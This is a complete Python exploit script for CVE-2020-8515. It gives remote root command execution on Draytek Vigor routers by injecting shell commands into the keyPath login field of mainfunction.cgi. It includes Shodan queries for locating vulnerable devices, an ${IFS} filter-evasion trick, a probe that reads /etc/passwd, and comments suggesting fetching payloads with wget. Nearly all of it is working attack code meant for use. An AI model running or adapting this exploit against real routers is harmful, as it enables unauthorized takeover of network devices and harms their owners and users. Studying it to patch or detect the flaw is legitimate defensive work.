#!/usr/bin/python
# Draytek Remote Root Exploit
# CVE-2020-8515
# Shodan: title:"Vigor 2960" title:"Vigor 3900" title:"Vigor 300B"

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def replace_spaces(str):
    # replace spaces with ${IFS} - we may need more badchar encoders later
    return str.replace(" ", "${IFS}")

def build_payload(command):
    # build payload
    template = "'\nPLACEHOLDER\n'"
    return template.replace("PLACEHOLDER", command)

def exec_command(target, command):
    print "(>) executing command: %s" %(command)
    url = target + "/cgi-bin/mainfunction.cgi"
    command = replace_spaces(command)
    payload = build_payload(command)
    post_data = {
        "action": "login",
        "keyPath": payload,
        "loginUser": "user",
        "loginPwd": "password"
    }
    try:
        r = requests.post(url=url, data=post_data, verify=False)
        return r.text
    except:
        return None

def probe(target):
    output = exec_command(target=target, command="cat /etc/passwd")
    if output != None:
        if "root:" in output:
            return True
        else:
            return False
    else:
    	return False

def do_stuff(target):
    # exec various commands here, example runs uname -a (previously telnetd)
    # you may, for example, wish to do some iptables fuckery, wget payload, etc.
    # we simply print exec_command output here for the example to show how work.
    # these are armv6l linux, you know what to do. 
    print exec_command(target=target, command="uname -a")


def main(args):
    if len(args) != 2:
        sys.exit("use: %s http://1.2.3.4:8080" %(args[0]))
    vuln = probe(target=args[1])
    if vuln == True:
        print "(+) vulnerable!"
        do_stuff(target=args[1])
    else:
    	print "(-) Not vulnerable!"

if __name__ == "__main__":
    main(args=sys.argv)
